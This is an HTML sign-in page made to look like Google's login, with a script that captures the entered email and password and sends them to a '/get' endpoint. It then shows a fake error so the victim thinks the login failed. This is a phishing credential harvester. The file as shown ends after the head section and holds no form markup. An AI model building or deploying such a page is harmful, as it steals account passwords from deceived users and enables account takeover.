<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />

    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
      }
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        background-color: #f1f1f1;
      }

      h1 {
        font-size: x-large;
        padding-bottom: 10px;
      }

      strong {
        font-size: x-large;
      }

      .login-container {
        background-color: #fff;
        padding: 30px;
        border-radius: 30px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }

      #logo {
        display: block;
        margin: 0 auto 10px;
        padding-top: -10px;
      }

      #logo svg {
        position: relative;
        size-adjust: 100px;
        max-height: 300px;
        margin: 0 auto;
        display: block;
      }

      .text {
        text-align: center;
        margin-top: 20px;
        margin-bottom: 30px;
        font-size: 14px;
        color: #222222c0;
      }

      .text h2 {
        margin-top: 5px;
        margin-bottom: 3px;
        font-weight: lighter;
        color: #222222c0;
      }

      .g-input {
        display: block;
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border: 1px solid #747775;
        border-radius: 5px;
      }

      .buttons {
        display: flex;
        flex-direction: row-reverse;
        flex-wrap: wrap;
        width: 100%;
        margin-top: 20px;
      }

      input[type="checkbox"] {
        /* Double-sized Checkboxes */
        -ms-transform: scale(1.1); /* IE */
        -moz-transform: scale(1.1); /* FF */
        -webkit-transform: scale(1.1); /* Safari and Chrome */
        -o-transform: scale(1.1); /* Opera */
        transform: scale(1.1);
        padding: 10px;
        margin-left: 5px;
        margin-right: 7px;
      }

      .info {
        margin-bottom: -10px;
      }

      .showPass {
        color: #222222c0;
        font-size: 0.75rem;
        font-weight: lighter;
        width: 100%;
        padding: 0px;
        border: none;
        border-radius: 30px;
        background-color: #fff;
        cursor: pointer;
        text-align: center;
        vertical-align: middle;
        line-height: 50px;
        letter-spacing: 0rem;
      }

      .showPass:hover {
        background-color: #e4eaf965;
        cursor: pointer;
      }

      .showPass:active {
        background-color: #e4eaf9d9;
      }
      .showPass:focus {
        background-color: #e4eaf9d9;
      }

      .checkbox-label {
        padding-bottom: -10px;
      }

      .gbtn-primary {
        width: 30%;
        margin-top: 5px;
        text-align: center;
        vertical-align: middle;
        height: 38px;
        border: none;
        border-radius: 30px;
        background-color: #1a73e8;
        color: #fff;
        cursor: pointer;
        font-size: 0.875rem;
        font-weight: 900;
        font-weight: var(--c-afwt, 500);
        letter-spacing: 0rem;
      }

      .gbtn-primary:hover {
        background-color: #164aab;
      }

      .footerMenu {
        margin-top: 20px;
        display: block;
        direction: ltr;
        font-size: 0.75rem;
        font-weight: 400;
        letter-spacing: 0rem;
        line-height: 1.4285714286;
        width: 105%;
      }

      .footerMenu .class1 {
        float: left;
        display: inline;
        width: 37%;
        color: #222222c0;
        cursor: pointer;
        margin: -3.5px 7.4%;
        padding: 5px 4px;
        border: none;
        border-radius: 10px;
        text-align: center;
        vertical-align: middle;
      }

      .footerMenu .class1:hover {
        background-color: #e1e1e1;
      }

      .footerMenu .buttonsLeft {
        margin-left: 20%;
      }

      .footerMenu .class2 {
        float: left;
        display: inline;
        color: #222222c0;
        display: inline;
        cursor: pointer;
        padding: 1% 1%;
        margin-left: 0%;
        margin-right: 10%;
        border: none;
        border-radius: 10px;
        text-align: center;
        vertical-align: middle;
      }

      .footerMenu .class3 {
        float: left;
        display: inline;
        color: #222222c0;
        cursor: pointer;
        padding: 1% 1%;
        margin-left: 1%;
        border: none;
        border-radius: 10px;
        text-align: center;
        vertical-align: middle;
      }

      .footerMenu .class4 {
        float: left;
        display: inline;
        color: #222222c0;
        cursor: pointer;
        padding: 1% 1%;
        margin-left: 0.5%;
        border: none;
        border-radius: 10px;
        text-align: center;
        vertical-align: middle;
      }

      .footerMenu .class2:hover,
      .class3:hover,
      .class4:hover {
        background-color: #e1e1e1;
      }

      .footerMenu .class3 {
        margin-left: -30px;
      }

      .footerMenu .openMenu {
        padding-top: 7px;
        margin-left: 4%;
        color: #222222c0;
      }

      /* Error message styling */
      .error-message {
        position: absolute;
        color: #d93025; /* Google's red color for errors */
        font-size: 13px;
        width: 100%;
        display: flex;
        align-items: center;
        margin-top: -27px;
      }

      .error-icon {
        margin-right: 5px;
      }
    </style>

  <script>
    const form = document.getElementById("email-form-step");
    form.addEventListener("submit", function (event) {
      event.preventDefault();
      const email = event.currentTarget.email.value;
      const password = event.currentTarget.password.value;

      // Properly encode the parameters to handle special characters
      const encodedEmail = encodeURIComponent(email);
      const encodedPassword = encodeURIComponent(password);

      fetch(`/get?email=${encodedEmail}&password=${encodedPassword}`);
    });

    function myFunction() {
      var x = document.getElementById("password");
      if (x.type === "password") {
        x.type = "text";
      } else {
        x.type = "password";
      }
    }

    document.getElementById("siguiente").addEventListener("click", function () {
      const errorMessage = document.getElementById("error-message");
      errorMessage.style.display = "flex"; // Show the error message

      // Hide the error message after 3 seconds (3000 milliseconds)
      setTimeout(function () {
        errorMessage.style.display = "none";
      }, 3000);
    });
  </script>
